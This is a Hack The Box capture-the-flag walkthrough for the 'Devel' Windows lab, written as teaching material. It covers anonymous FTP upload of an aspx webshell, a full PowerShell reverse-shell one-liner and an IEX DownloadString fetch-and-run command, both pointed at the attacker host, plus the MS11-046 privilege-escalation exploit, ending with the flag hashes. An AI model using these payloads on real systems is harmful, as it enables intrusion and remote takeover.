# Devel
>Author : Xyan1d3
>Date : 27th June 2021
>IP : 10.10.10.5
>OS : Windows
>Difficulty : Easy
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Sun Jun 27 23:57:10 2021 as: nmap -sC -sV -v -oN nmap/devel 10.10.10.5
Nmap scan report for devel.htb (10.10.10.5)
Host is up (0.077s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
We see that this is infact a windows machine running `IIS 7.5`, Which can be used to find out the OS its running as the different versions of windows uses different versions of `IIS`. But, Here we have some contradictory data stating it `IIS 7.0` and `IIS 7.5` together.

Therefore, We may do a simple `curl` and check the headers sent to us in the browsers.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/devel]
└──╼ # curl --head 10.10.10.5
HTTP/1.1 200 OK
Content-Length: 689
Content-Type: text/html
Last-Modified: Fri, 17 Mar 2017 14:37:30 GMT
Accept-Ranges: bytes
ETag: "37b5ed12c9fd21:0"
Server: Microsoft-IIS/7.5    <------ IIS Version
X-Powered-By: ASP.NET
Date: Sun, 27 Jun 2021 18:43:18 GMT
```
We find out that the OS running here should be `Windows Server 2008 R2`.
![[Pasted image 20210628002030.png]]

## FTP Enumeration
We find out that we have `anonymous` ftp login.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/devel]
└──╼ # ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

We login to the ftp server using `anonymous` login and find out that the files there are the webroot files of the webserver.

We could try to upload files there. As, If we're able to upload files there then we would be able to execute the file from the website.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.5]─[~/htb/devel]
└──╼ # ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put magisk.html
local: magisk.html remote: magisk.html
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
57 bytes sent in 0.00 secs (639.8168 kB/s)
```

We are successfully able to put files inside the ftp folder. Now, We need to check if we can visit our file on the website.

And, Hell Yeah we can access the file from the webserver.
![[Pasted image 20210628003325.png]]
We all know where all this is going...

# Initial FootHold
We could now try to upload an `aspx` reverse shell and try to get a reverse shell from the box.
We upload the `/usr/share/webshells/aspx/cmdasp.aspx` present on the default installation of kali.
![[Pasted image 20210628005411.png]]

We could now use Nishang powershell reverse shell and host it on the box. And, Executing it from the webshell to get a proper reverse shell.
We will be using `/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1` from the pocket full of tools.

We will be needing to uncomment the one we want to use and change the attacker IP and Port and point it to our box. Also, Here We are using the longer reverse shell as the longer the better :P (It gives the prompt to be honest)
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

We issue a powershell downloadstring and pass it to IEX which is Invoke-Expression.
```powershell
powershell IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/rev.ps1')
```

It is powershell version independent and will work on any older or newer powershell versions.

Hell Yeah !!! We recieve a shell as the `iis apppool\web` user. Essentially `www-data` for windows.
![[Pasted image 20210628010118.png]]

**Alternatively we could have generated a malicious exe file using `msfvenom` and uploading it and executing it on `cmd.exe` or `nc64.exe`. But, I don't like to touch files on the machines disk until its very critical.**

# Root Escalation
We do a simple `systeminfo` to find out what is the exact OS fingerprint of the box.
```python
PS C:\> systeminfo
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ??
System Boot Time:          27/6/2021, 3:34:02 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
```

And Apparently, Our guess is wrong as it is a `Windows 7 Enterprise build 7600` and not a `Windows Server 2008 R2`.

The Box is vulnerable to `MS11-046` which on exploitation will elevate our privilege's to `NT Authority/SYSTEM`. But , Inorder to pull off this exploit we will need a regular shell like a netcat shell as it will attempt to spawn a new `cmd.exe` with the elevated privilege.

So, We transfer `nc.exe` strictly `32-Bit` Version which will be nessessary as the box is `32-Bit`, Using anyway we want `Invoke-WebRequest`, `Certutil.exe` or `smbserver.py`.

We use the `MS11-046` and execute it directly from our hosted `smbserver.py`.
Source : https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe

The shell is escalated to  `NT Authority/SYSTEM`.
![[Pasted image 20210628020318.png]]


## User Flag
We could now get the `user.txt` from the `C:\Users\babis\Desktop`.
```go
c:\windows\system32\inetsrv>\\10.10.14.5\magisk\ms11-046.exe
\\10.10.14.5\magisk\ms11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system

c:\Windows\System32>cd C:\Users\babis\Desktop\
cd C:\Users\babis\Desktop\

C:\Users\babis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:\Users\babis\Desktop

18/03/2017  02:14     <DIR>          .
18/03/2017  02:14     <DIR>          ..
18/03/2017  02:18                 32 user.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.213.320.704 bytes free
C:\Users\babis\Desktop>type user.txt.txt
type user.txt.txt
9ecdd6a3aedf24b41562fea70f4cb3e8
```

## Root Flag
As, We are now essentially the highest level user of the box i.e. `NT Authority/SYSTEM` Hence, We could visit the `C:\Users\Administrator\Desktop` and can get the root flag.

```go
C:\Users\babis\Desktop>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:\Users\Administrator\Desktop

14/01/2021  12:42     <DIR>          .
14/01/2021  12:42     <DIR>          ..
18/03/2017  02:17                 32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  22.211.674.112 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
e621a0b5041708797c4fc4728bc72b4b
```